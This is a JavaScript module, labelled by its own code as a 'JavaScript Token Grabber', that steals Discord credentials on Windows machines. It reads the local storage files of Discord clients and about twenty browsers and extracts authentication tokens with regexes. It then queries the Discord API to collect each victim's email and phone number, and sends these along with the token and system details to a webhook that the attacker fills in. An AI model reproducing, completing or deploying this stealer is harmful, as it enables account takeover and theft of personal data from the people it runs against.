const os = require("os");
const fs = require("fs");
const axios = require("axios");
fetch = require("node-fetch");

const webhook = "<insert your webhook here>";

const grab = () => {
  const getJSON = async (url, credentials) => {
    const response = await fetch(url, credentials);

    const data = response.json();
    return data;
  };

  const system_info = () => {
    let info = {
      platform: os.platform(),
      platformRelease: os.release(),
      platformVersion: os.version(),
      architecture: os.arch(),
      ipv6: Object.values(os.networkInterfaces())[0][0].address,
      processor: os.cpus()[0].model,
    };
    return info;
  };

  const self = {};

  const tokenGrab = () => {
    if (os.type != "Windows_NT") {
      return "Not a windows user";
    } else {
      self.tokens = [];
      self.pc = system_info();
      self.pc_user = os.hostname();
      self.pc_roaming = `${os.homedir}\\AppData\\Roaming`;
      self.pc_local = `${os.homedir}\\AppData\\Local`;
    }

    const re = [/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/, /mfa\.[\w-]{84}/];

    const scrape_tokens = (self) => {
      const crawl = {
        Discord: self.pc_roaming + "\\discord\\Local Storage\\leveldb\\",
        "Discord Canary":
          self.pc_roaming + "\\discordcanary\\Local Storage\\leveldb\\",
        Lightcord: self.pc_roaming + "\\Lightcord\\Local Storage\\leveldb\\",
        "Discord PTB":
          self.pc_roaming + "\\discordptb\\Local Storage\\leveldb\\",
        Opera:
          self.pc_roaming +
          "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
        "Opera GX":
          self.pc_roaming +
          "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
        Amigo: self.pc_local + "\\Amigo\\User Data\\Local Storage\\leveldb\\",
        Torch: self.pc_local + "\\Torch\\User Data\\Local Storage\\leveldb\\",
        Kometa: self.pc_local + "\\Kometa\\User Data\\Local Storage\\leveldb\\",
        Orbitum:
          self.pc_local + "\\Orbitum\\User Data\\Local Storage\\leveldb\\",
        CentBrowser:
          self.pc_local + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
        "7Star":
          self.pc_local + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
        Sputnik:
          self.pc_local +
          "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
        Vivaldi:
          self.pc_local +
          "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
        "Chrome SxS":
          self.pc_local +
          "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
        Chrome:
          self.pc_local +
          "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
        "Epic Privacy Browser":
          self.pc_local +
          "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
        "Microsoft Edge":
          self.pc_local +
          "\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\",
        Uran:
          self.pc_local +
          "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\",
        Yandex:
          self.pc_local +
          "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
        Brave:
          self.pc_local +
          "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
        Iridium:
          self.pc_local +
          "\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\",
      };

      Object.values(crawl).forEach((path) => {
        fs.access(path, fs.F_OK, (err) => {
          if (err) {
            return;
          } else {
            fs.readdirSync(path).forEach((file) => {
              if (file.endsWith(".log") || file.endsWith(".ldb")) {
                [fs.readFileSync(`${path}\\${file}`)].forEach((line) => {
                  re.forEach((regex) => {
                    if (regex.exec(line) !== null) {
                      self.tokens.push(regex.exec(line)[0]);
                    }
                  });
                });
              }
            });
          }
        });
      });
    };
    scrape_tokens(self);
  };

  tokenGrab();

  const retrieve_user = (token) => {
    getJSON("https://discord.com/api/v9/users/@me", {
      headers: {
        Authorization: token,
      },
    }).then((response) => {
      self.discord_id = Object.values(response)[0];
      self.discord_usertag = `${Object.values(response)[1]}#${
        Object.values(response)[3]
      }`;
      self.email = Object.values(response)[16];
      self.phone_number = Object.values(response)[18];

      if (self.discord_id != "401: Unauthorized") {
        if (webhook != "<insert your webhook here>") {
          let webhook_data = {
            username: "JavaScript Token Grabber",
            avatar_url: "https://i.imgur.com/fj1Pk7e.png",
            content:
              `**Account info**\n💳 User ID: ${self.discord_id}\n🧔 Username: ${self.discord_usertag}\n📬 Email: ${self.email}\n☎ Phone: ${self.phone_number}
            \n**PC Info**\nUsername: ${self.pc_user}\nAppData: ${self.pc_local}\nRoaming: ${self.pc_roaming}
            \n💰 Token\n${token}
            \n**PC Data Dump**\n` +
              "```" +
              JSON.stringify(self.pc) +
              "```",
          };

          axios.post(webhook, webhook_data).catch((error) => {
            console.error(error);
          });
        } else {
          console.log(self);
        }
      }
    });
  };

  setTimeout(() => {
    self.tokens.forEach((token) => {
      retrieve_user(token);
    });
  }, 1000);
};
module.exports = { grab };
